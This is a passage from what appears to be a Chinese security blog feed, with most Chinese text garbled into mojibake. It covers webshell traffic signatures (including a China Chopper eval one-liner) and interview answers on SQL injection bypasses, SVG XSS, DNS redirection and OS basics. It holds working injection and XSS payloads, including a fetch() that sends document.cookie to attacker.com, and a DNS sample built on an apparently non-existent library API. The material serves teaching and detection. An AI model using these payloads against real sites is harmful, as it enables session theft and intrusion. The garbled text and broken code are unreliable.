request(â€œcaidaoâ€)%&gt;</p><p>ASP.NET: &lt;%@ Page<br>Language&#x3D;â€œJscriptâ€%&gt;&lt;%eval(Request.Item[â€œcaidaoâ€],â€œunsafeâ€);%&gt;</p><p>æ•°æ®åŒ…æµé‡ç‰¹å¾ï¼š<br>1ï¼Œè¯·æ±‚åŒ…ä¸­ï¼šuaå¤´ä¸ºç™¾åº¦ï¼Œç«ç‹<br>2ï¼Œè¯·æ±‚ä½“ä¸­å­˜åœ¨eavlï¼Œbase64ç­‰ç‰¹å¾å­—ç¬¦<br>3ï¼Œè¯·æ±‚ä½“ä¸­ä¼ é€’çš„payloadä¸ºbase64ç¼–ç ï¼Œå¹¶ä¸”å­˜åœ¨å›ºå®šçš„QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J<br><strong>å†°èæµé‡åˆ†æ</strong><br>paylaodåˆ†æï¼š<br>phpåœ¨ä»£ç ä¸­åŒæ ·ä¼šå­˜åœ¨evalæˆ–assertç­‰å­—ç¬¦ç‰¹å¾<br>åœ¨apsä¸­ä¼šåœ¨forå¾ªç¯è¿›è¡Œä¸€æ®µå¼‚æˆ–å¤„ç†</p><p>åœ¨jspä¸­åˆ™åˆ©ç”¨javaçš„åå°„ï¼Œæ‰€ä»¥ä¼šå­˜åœ¨ClassLoaderï¼ŒgetClass().getClassLoader()ç­‰å­—ç¬¦ç‰¹å¾</p><p>å†°è2.0æµé‡ç‰¹å¾ï¼š<br>ç¬¬ä¸€é˜¶æ®µè¯·æ±‚ä¸­è¿”å›åŒ…çŠ¶æ€ç ä¸º200ï¼Œè¿”å›å†…å®¹å¿…å®šæ˜¯16ä½çš„å¯†é’¥<br>è¯·æ±‚åŒ…å­˜åœ¨ï¼šAccept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, ; q&#x3D;.2, &#x2F;; q&#x3D;.2</p><p>å»ºç«‹è¿æ¥åçš„cookieå­˜åœ¨ç‰¹å¾å­—ç¬¦<br>æ‰€æœ‰è¯·æ±‚ Cookieçš„æ ¼å¼éƒ½ä¸º: Cookie: PHPSESSID&#x3D;; path&#x3D;&#x2F;ï¼›</p><p>å†°è3.0æµé‡ç‰¹å¾ï¼š<br>è¯·æ±‚åŒ…ä¸­content-length ä¸º5740æˆ–5720ï¼ˆå¯èƒ½ä¼šæ ¹æ®Javaç‰ˆæœ¬è€Œæ”¹å˜ï¼‰<br>æ¯ä¸€ä¸ªè¯·æ±‚å¤´ä¸­å­˜åœ¨<br>Pragma: no-cacheï¼ŒCache-Control: no-cache<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9<br><strong>å“¥æ–¯æ‹‰æµé‡</strong><br>payloadç‰¹å¾ï¼š<br>jspä¼šå‡ºç°xc,passå­—ç¬¦å’ŒJavaåå°„ï¼ˆClassLoaderï¼ŒgetClass().getClassLoader()ï¼‰ï¼Œbase64åŠ è§£ç ç­‰ç‰¹å¾<br>phpï¼Œaspåˆ™ä¸ºæ™®é€šçš„ä¸€å¥è¯æœ¨é©¬</p><p>å“¥æ–¯æ‹‰æµé‡åˆ†æï¼š<br>ä½œä¸ºå‚è€ƒï¼š<br>æ‰€æœ‰è¯·æ±‚ä¸­Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,&#x2F;;q&#x3D;0.8<br>æ‰€æœ‰å“åº”ä¸­Cache-Control: no-store, no-cache, must-revalidate,<br>åŒæ—¶åœ¨æ‰€æœ‰è¯·æ±‚ä¸­Cookieä¸­åé¢éƒ½å­˜åœ¨ï¼›ç‰¹å¾</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥ä½œã€‘é¢è¯•é¢˜æ•´ç† å¤§å‚å¸¸è§é—®é¢˜2</title>
      <link href="/2024/03/17/work/workpre5/"/>
      <url>/2024/03/17/work/workpre5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x19-å­—èŠ‚è·³åŠ¨å®ä¹ é¢è¯•å¤ç›˜"><a href="#0x19-å­—èŠ‚è·³åŠ¨å®ä¹ é¢è¯•å¤ç›˜" class="headerlink" title="0x19 å­—èŠ‚è·³åŠ¨å®ä¹ é¢è¯•å¤ç›˜"></a>0x19 å­—èŠ‚è·³åŠ¨å®ä¹ é¢è¯•å¤ç›˜</h2><h3 id="1-SQL-æ³¨å…¥ï¼šç©ºæ ¼ç»•è¿‡ã€å¼•å·ç»•è¿‡"><a href="#1-SQL-æ³¨å…¥ï¼šç©ºæ ¼ç»•è¿‡ã€å¼•å·ç»•è¿‡" class="headerlink" title="1. SQL æ³¨å…¥ï¼šç©ºæ ¼ç»•è¿‡ã€å¼•å·ç»•è¿‡"></a><strong>1. SQL æ³¨å…¥ï¼šç©ºæ ¼ç»•è¿‡ã€å¼•å·ç»•è¿‡</strong></h3><h4 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a><strong>ç©ºæ ¼ç»•è¿‡</strong></h4><p>åœ¨ SQL æ³¨å…¥ä¸­ï¼Œç©ºæ ¼å¯èƒ½è¢«è¿‡æ»¤æˆ–æ›¿æ¢ä¸ºå…¶ä»–å­—ç¬¦ï¼ˆå¦‚ <code>+</code>ï¼‰ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p><ul><li>ä½¿ç”¨æ³¨é‡Šç¬¦ï¼ˆ<code>/* */</code> æˆ– <code>--</code>ï¼‰æ›¿ä»£ç©ºæ ¼ã€‚</li><li>ä½¿ç”¨ Unicode ç¼–ç ï¼ˆå¦‚ <code>\x20</code>ï¼‰è¡¨ç¤ºç©ºæ ¼ã€‚</li><li>ä½¿ç”¨ SQL å‡½æ•°ï¼ˆå¦‚ <code>CHAR(32)</code>ï¼‰ç”Ÿæˆç©ºæ ¼ã€‚</li></ul><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># åŸå§‹æ³¨å…¥ï¼š<span class="string">&#x27; OR 1=1 --</span></span><br><span class="line"><span class="string"># ç»•è¿‡ç©ºæ ¼ï¼š</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/* */</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; OR 1=1--+</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">09</span><span class="comment">--  # åˆ¶è¡¨ç¬¦æ›¿ä»£ç©ºæ ¼</span></span><br><span class="line"><span class="string">&#x27; OR 1=1%0A--  # æ¢è¡Œç¬¦æ›¿ä»£ç©ºæ ¼</span></span><br></pre></td></tr></table></figure><h4 id="å¼•å·ç»•è¿‡"><a href="#å¼•å·ç»•è¿‡" class="headerlink" title="å¼•å·ç»•è¿‡"></a><strong>å¼•å·ç»•è¿‡</strong></h4><p>å¦‚æœå•å¼•å·ï¼ˆ<code>&#39;</code>ï¼‰æˆ–åŒå¼•å·ï¼ˆ<code>&quot;</code>ï¼‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p><ul><li>ä½¿ç”¨å­—ç¬¦æ‹¼æ¥ï¼ˆå¦‚ <code>CONCAT</code>ï¼‰ã€‚</li><li>ä½¿ç”¨ Unicode ç¼–ç ï¼ˆå¦‚ <code>CHAR(39)</code> è¡¨ç¤º <code>&#39;</code>ï¼‰ã€‚</li><li>ä½¿ç”¨æ³¨é‡Šç¬¦ç»•è¿‡å¼•å·ã€‚</li></ul><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># åŸå§‹æ³¨å…¥ï¼š<span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"># ç»•è¿‡å¼•å·ï¼š</span><br><span class="line"><span class="string">&#x27; OR 1=1--+</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> <span class="number">0x31</span><span class="operator">=</span><span class="number">0x31</span><span class="comment">--  # ä½¿ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºæ•°å­—</span></span><br><span class="line"><span class="string">&#x27; OR &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27; OR (SELECT CHAR(97))=(SELECT CHAR(97))--  # ä½¿ç”¨ CHAR å‡½æ•°ç”Ÿæˆå­—ç¬¦</span></span><br></pre></td></tr></table></figure><hr><h3 id="2-XSS-ä¸­-SVG-çš„åˆ©ç”¨å’Œä¿®å¤"><a href="#2-XSS-ä¸­-SVG-çš„åˆ©ç”¨å’Œä¿®å¤" class="headerlink" title="2. XSS ä¸­ SVG çš„åˆ©ç”¨å’Œä¿®å¤"></a><strong>2. XSS ä¸­ SVG çš„åˆ©ç”¨å’Œä¿®å¤</strong></h3><h4 id="SVG-çš„åˆ©ç”¨"><a href="#SVG-çš„åˆ©ç”¨" class="headerlink" title="SVG çš„åˆ©ç”¨"></a><strong>SVG çš„åˆ©ç”¨</strong></h4><p>SVGï¼ˆScalable Vector Graphicsï¼‰æ˜¯ä¸€ç§åŸºäº XML çš„å›¾å½¢æ ¼å¼ï¼Œæ”¯æŒåµŒå…¥ JavaScript è„šæœ¬ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ SVG æ–‡ä»¶æ‰§è¡Œ XSS æ”»å‡»ã€‚</p><p><strong>ç¤ºä¾‹ä»£ç ï¼ˆæ”»å‡»ï¼‰ï¼š</strong></p><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¦ä¸€ç§æ–¹å¼ï¼ˆäº‹ä»¶å±æ€§ï¼‰ï¼š</strong></p><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://attacker.com/log?c=&#x27;+document.cookie)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Click me!&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ä¿®å¤æ–¹æ³•"><a href="#ä¿®å¤æ–¹æ³•" class="headerlink" title="ä¿®å¤æ–¹æ³•"></a><strong>ä¿®å¤æ–¹æ³•</strong></h4><ol><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·ä¸Šä¼ çš„ SVG æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å†…å®¹è¿‡æ»¤ï¼Œç¦æ­¢åŒ…å« <code>&lt;script&gt;</code> æ ‡ç­¾å’Œäº‹ä»¶å±æ€§ï¼ˆå¦‚ <code>onload</code>ï¼‰ã€‚</li><li><strong>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰</strong>ï¼šé€šè¿‡ HTTP å“åº”å¤´é™åˆ¶è„šæœ¬æ‰§è¡Œã€‚<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;none&#x27;</span><br></pre></td></tr></table></figure></li><li><strong>æ²™ç®±åŒ–</strong>ï¼šå°† SVG æ¸²æŸ“åœ¨æ²™ç®±åŒ–çš„ iframe ä¸­ï¼Œé™åˆ¶å…¶ä¸ä¸»é¡µé¢çš„äº¤äº’ã€‚</li></ol><p><strong>ä¿®å¤ä»£ç ç¤ºä¾‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ Python çš„ defusedxml åº“è§£æ SVGï¼Œé˜²æ­¢ XSS</span></span><br><span class="line"><span class="keyword">from</span> defusedxml <span class="keyword">import</span> minidom</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_svg</span>(<span class="params">svg_data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è§£æ SVG å¹¶ç§»é™¤å±é™©æ ‡ç­¾</span></span><br><span class="line">        dom = minidom.parseString(svg_data)</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> dom.getElementsByTagName(<span class="string">&#x27;script&#x27;</span>):</span><br><span class="line">            node.parentNode.removeChild(node)</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> dom.getElementsByTagName(<span class="string">&#x27;style&#x27;</span>):</span><br><span class="line">            node.parentNode.removeChild(node)</span><br><span class="line">        <span class="keyword">return</span> dom.toxml()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><hr><h3 id="3-DNS-é‡å®šå‘ç»‘å®š"><a href="#3-DNS-é‡å®šå‘ç»‘å®š" class="headerlink" title="3. DNS é‡å®šå‘ç»‘å®š"></a><strong>3. DNS é‡å®šå‘ç»‘å®š</strong></h3><h4 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a><strong>æ”»å‡»åŸç†</strong></h4><p>DNS é‡å®šå‘æ”»å‡»é€šè¿‡ç¯¡æ”¹ DNS è®°å½•ï¼Œå°†åˆæ³•åŸŸåè§£æåˆ°æ”»å‡»è€…çš„ IP åœ°å€ï¼Œä»è€ŒåŠ«æŒæµé‡ã€‚</p><p><strong>ç¤ºä¾‹æ”»å‡»æµç¨‹ï¼š</strong></p><ol><li>æ”»å‡»è€…æ§åˆ¶ DNS æœåŠ¡å™¨æˆ–åˆ©ç”¨ DNS ç¼“å­˜ä¸­æ¯’ã€‚</li><li>å°† <code>example.com</code> çš„ A è®°å½•æŒ‡å‘æ”»å‡»è€…çš„ IPï¼ˆå¦‚ <code>192.168.1.100</code>ï¼‰ã€‚</li><li>ç”¨æˆ·è®¿é—® <code>example.com</code> æ—¶ï¼Œæµé‡è¢«é‡å®šå‘åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚</li></ol><p><strong>æ”»å‡»ä»£ç ï¼ˆæ¨¡æ‹Ÿ DNS é‡å®šå‘ï¼‰ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ dnspython åº“æ¨¡æ‹Ÿ DNS é‡å®šå‘</span></span><br><span class="line"><span class="keyword">from</span> dns.server <span class="keyword">import</span> DNSServer</span><br><span class="line"><span class="keyword">from</span> dns.zone <span class="keyword">import</span> Zone</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè‡ªå®šä¹‰ DNS æœåŠ¡å™¨</span></span><br><span class="line">zone = Zone(<span class="string">&#x27;example.com&#x27;</span>)</span><br><span class="line">zone.add_a_record(<span class="string">&#x27;example.com&#x27;</span>, <span class="string">&#x27;192.168.1.100&#x27;</span>)  <span class="comment"># é‡å®šå‘åˆ°æ”»å‡»è€… IP</span></span><br><span class="line"></span><br><span class="line">server = DNSServer(zone, port=<span class="number">53</span>)</span><br><span class="line">server.start()</span><br></pre></td></tr></table></figure><h4 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a><strong>é˜²å¾¡æ–¹æ³•</strong></h4><ol><li><strong>ä½¿ç”¨ DNSSEC</strong>ï¼šç¡®ä¿ DNS è®°å½•çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‚</li><li><strong>é™åˆ¶ DNS ç¼“å­˜æ—¶é—´ï¼ˆTTLï¼‰</strong>ï¼šå‡å°‘ç¼“å­˜ä¸­æ¯’çš„é£é™©ã€‚</li><li><strong>HTTPS ä¸¥æ ¼ä¼ è¾“å®‰å…¨ï¼ˆHSTSï¼‰</strong>ï¼šå¼ºåˆ¶ä½¿ç”¨ HTTPSï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»ã€‚</li><li><strong>ç›‘æ§ DNS è®°å½•</strong>ï¼šå®šæœŸæ£€æŸ¥ DNS è®°å½•çš„å¼‚å¸¸å˜åŒ–ã€‚</li></ol><p><strong>é˜²å¾¡ä»£ç ç¤ºä¾‹ï¼ˆHSTS é…ç½®ï¼‰ï¼š</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx é…ç½® HSTS</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°ç»„å’Œé“¾è¡¨çš„ä¼˜åŠ¿åŠåŸå› "><a href="#æ•°ç»„å’Œé“¾è¡¨çš„ä¼˜åŠ¿åŠåŸå› " class="headerlink" title="æ•°ç»„å’Œé“¾è¡¨çš„ä¼˜åŠ¿åŠåŸå› "></a>æ•°ç»„å’Œé“¾è¡¨çš„ä¼˜åŠ¿åŠåŸå› </h3><ol><li><p><strong>æ•°ç»„</strong>ï¼š</p><ul><li><strong>ä¼˜åŠ¿</strong>ï¼š<ul><li><strong>éšæœºè®¿é—®</strong>ï¼šæ•°ç»„æ”¯æŒé€šè¿‡ç´¢å¼•ç›´æ¥è®¿é—®å…ƒç´ ï¼Œè®¿é—®æ—¶é—´å¤æ‚åº¦ä¸ºO(1)ã€‚</li><li><strong>å†…å­˜è¿ç»­æ€§</strong>ï¼šæ•°ç»„åœ¨å†…å­˜ä¸­æ˜¯è¿ç»­å­˜å‚¨çš„ï¼Œä¾¿äºç¼“å­˜ä¼˜åŒ–å’Œå†…å­˜ç®¡ç†ã€‚</li><li><strong>é«˜æ•ˆæ€§</strong>ï¼šåœ¨é¡ºåºè®¿é—®æ—¶ï¼Œæ•°ç»„çš„æ€§èƒ½ä¼˜äºé“¾è¡¨ï¼Œå› ä¸ºå†…å­˜è®¿é—®æ›´é«˜æ•ˆã€‚</li></ul></li><li><strong>åŸå› </strong>ï¼š<ul><li>æ•°ç»„çš„å†…å­˜åˆ†é…æ˜¯è¿ç»­çš„ï¼Œè¿™ä½¿å¾—å®ƒåœ¨è®¿é—®æ—¶å¯ä»¥åˆ©ç”¨CPUç¼“å­˜ï¼Œæé«˜æ€§èƒ½ã€‚</li><li>æ•°ç»„çš„ç´¢å¼•è®¿é—®æœºåˆ¶ä½¿å…¶åœ¨éœ€è¦å¿«é€ŸæŸ¥æ‰¾æˆ–æ›´æ–°å…ƒç´ æ—¶éå¸¸é«˜æ•ˆã€‚</li></ul></li></ul></li><li><p><strong>é“¾è¡¨</strong>ï¼š</p><ul><li><strong>ä¼˜åŠ¿</strong>ï¼š<ul><li><strong>åŠ¨æ€å¤§å°</strong>ï¼šé“¾è¡¨çš„å¤§å°å¯ä»¥åŠ¨æ€è°ƒæ•´ï¼Œä¸éœ€è¦é¢„å…ˆåˆ†é…å›ºå®šå¤§å°çš„å†…å­˜ã€‚</li><li><strong>æ’å…¥å’Œåˆ é™¤é«˜æ•ˆ</strong>ï¼šé“¾è¡¨åœ¨æ’å…¥å’Œåˆ é™¤å…ƒç´ æ—¶ï¼Œåªéœ€è°ƒæ•´æŒ‡é’ˆï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(1)ï¼ˆåœ¨å·²çŸ¥ä½ç½®çš„æƒ…å†µä¸‹ï¼‰ã€‚</li></ul></li><li><strong>åŸå› </strong>ï¼š<ul><li>é“¾è¡¨çš„å†…å­˜åˆ†é…æ˜¯åˆ†æ•£çš„ï¼Œä¸éœ€è¦è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œè¿™ä½¿å¾—å®ƒåœ¨å†…å­˜ä¸è¶³æ—¶ä»ç„¶å¯ä»¥æ‰©å±•ã€‚</li><li>é“¾è¡¨çš„æŒ‡é’ˆæœºåˆ¶ä½¿å¾—æ’å…¥å’Œåˆ é™¤æ“ä½œä¸éœ€è¦ç§»åŠ¨å¤§é‡å…ƒç´ ï¼Œæé«˜äº†æ•ˆç‡ã€‚</li></ul></li></ul></li></ol><h3 id="æ“ä½œç³»ç»Ÿå±‚é¢è§£é‡Šè¿›ç¨‹å’Œçº¿ç¨‹åŒºåˆ«"><a href="#æ“ä½œç³»ç»Ÿå±‚é¢è§£é‡Šè¿›ç¨‹å’Œçº¿ç¨‹åŒºåˆ«" class="headerlink" title="æ“ä½œç³»ç»Ÿå±‚é¢è§£é‡Šè¿›ç¨‹å’Œçº¿ç¨‹åŒºåˆ«"></a>æ“ä½œç³»ç»Ÿå±‚é¢è§£é‡Šè¿›ç¨‹å’Œçº¿ç¨‹åŒºåˆ«</h3><ol><li><p><strong>è¿›ç¨‹</strong>ï¼š</p><ul><li><strong>å®šä¹‰</strong>ï¼šè¿›ç¨‹æ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œå®ä¾‹ï¼Œæ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼š<ul><li><strong>ç‹¬ç«‹æ€§</strong>ï¼šæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´å’Œèµ„æºã€‚</li><li><strong>è°ƒåº¦å•ä½</strong>ï¼šè¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚</li></ul></li><li><strong>åŸå› </strong>ï¼šè¿›ç¨‹çš„ç‹¬ç«‹æ€§ä½¿å¾—å®ƒåœ¨å¤šä»»åŠ¡å¤„ç†æ—¶èƒ½å¤Ÿæä¾›è‰¯å¥½çš„éš”ç¦»æ€§ï¼Œé¿å…èµ„æºå†²çªã€‚</li></ul></li><li><p><strong>çº¿ç¨‹</strong>ï¼š</p><ul><li><strong>å®šä¹‰</strong>ï¼šçº¿ç¨‹æ˜¯è¿›ç¨‹ä¸­çš„ä¸€ä¸ªæ‰§è¡Œå•å…ƒï¼Œæ˜¯CPUè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼š<ul><li><strong>å…±äº«èµ„æº</strong>ï¼šçº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´å’Œèµ„æºã€‚</li><li><strong>è½»é‡çº§</strong>ï¼šçº¿ç¨‹çš„åˆ›å»ºå’Œåˆ‡æ¢å¼€é”€è¾ƒå°ã€‚</li></ul></li><li><strong>åŸå› </strong>ï¼šçº¿ç¨‹å…±äº«èµ„æºçš„ç‰¹æ€§ä½¿å¾—å®ƒåœ¨å¹¶å‘ç¼–ç¨‹ä¸­èƒ½å¤Ÿæ›´é«˜æ•ˆåœ°åˆ©ç”¨ç³»ç»Ÿèµ„æºï¼Œå‡å°‘ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€ã€‚</li></ul></li></ol><h3 id="çº¿ç¨‹å’Œè¿›ç¨‹é€šä¿¡æ–¹å¼ä»¥åŠæ•°æ®å®‰å…¨é—®é¢˜"><a href="#çº¿ç¨‹å’Œè¿›ç¨‹é€šä¿¡æ–¹å¼ä»¥åŠæ•°æ®å®‰å…¨é—®é¢˜" class="headerlink" title="çº¿ç¨‹å’Œè¿›ç¨‹é€šä¿¡æ–¹å¼ä»¥åŠæ•°æ®å®‰å…¨é—®é¢˜"></a>çº¿ç¨‹å’Œè¿›ç¨‹é€šä¿¡æ–¹å¼ä»¥åŠæ•°æ®å®‰å…¨é—®é¢˜</h3><ol><li><p><strong>é€šä¿¡æ–¹å¼</strong>ï¼š</p><ul><li><strong>è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰</strong>ï¼š<ul><li><strong>ç®¡é“ï¼ˆPipeï¼‰</strong>ï¼šç”¨äºçˆ¶å­è¿›ç¨‹ä¹‹é—´çš„å•å‘é€šä¿¡ã€‚</li><li><strong>æ¶ˆæ¯é˜Ÿåˆ—</strong>ï¼šç”¨äºè¿›ç¨‹é—´ä¼ é€’æ¶ˆæ¯ã€‚</li><li><strong>å…±äº«å†…å­˜</strong>ï¼šè¿›ç¨‹å…±äº«ä¸€å—å†…å­˜åŒºåŸŸè¿›è¡Œæ•°æ®äº¤æ¢ã€‚</li></ul></li><li><strong>çº¿ç¨‹é—´é€šä¿¡</strong>ï¼š<ul><li><strong>å…±äº«å˜é‡</strong>ï¼šçº¿ç¨‹é€šè¿‡å…±äº«å˜é‡è¿›è¡Œé€šä¿¡ã€‚</li><li><strong>é”å’Œæ¡ä»¶å˜é‡</strong>ï¼šç”¨äºçº¿ç¨‹é—´çš„åŒæ­¥ã€‚</li></ul></li><li><strong>åŸå› </strong>ï¼šè¿›ç¨‹é—´é€šä¿¡éœ€è¦é€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„æœºåˆ¶ï¼Œè€Œçº¿ç¨‹é—´é€šä¿¡ç”±äºå…±äº«å†…å­˜ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡å˜é‡è¿›è¡Œã€‚</li></ul></li><li><p><strong>æ•°æ®å®‰å…¨é—®é¢˜</strong>ï¼š</p><ul><li><strong>ç«äº‰æ¡ä»¶</strong>ï¼šå¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®å…±äº«èµ„æºå¯èƒ½å¯¼è‡´æ•°æ®ä¸ä¸€è‡´ã€‚</li><li><strong>æ­»é”</strong>ï¼šå¤šä¸ªçº¿ç¨‹æˆ–è¿›ç¨‹äº’ç›¸ç­‰å¾…å¯¹æ–¹é‡Šæ”¾èµ„æºï¼Œå¯¼è‡´ç³»ç»Ÿåœæ»ã€‚</li><li><strong>åŸå› </strong>ï¼šçº¿ç¨‹å’Œè¿›ç¨‹çš„å¹¶å‘æ‰§è¡Œå¯èƒ½å¯¼è‡´èµ„æºç«äº‰å’ŒåŒæ­¥é—®é¢˜ï¼Œéœ€è¦é€šè¿‡é”ã€ä¿¡å·é‡ç­‰æœºåˆ¶æ¥è§£å†³ã€‚</li></ul></li></ol><h3 id="å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹çš„é€‰ç”¨åœºæ™¯ä»¥åŠåŸå› "><a href="#å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹çš„é€‰ç”¨åœºæ™¯ä»¥åŠåŸå› " class="headerlink" title="å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹çš„é€‰ç”¨åœºæ™¯ä»¥åŠåŸå› "></a>å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹çš„é€‰ç”¨åœºæ™¯ä»¥åŠåŸå› 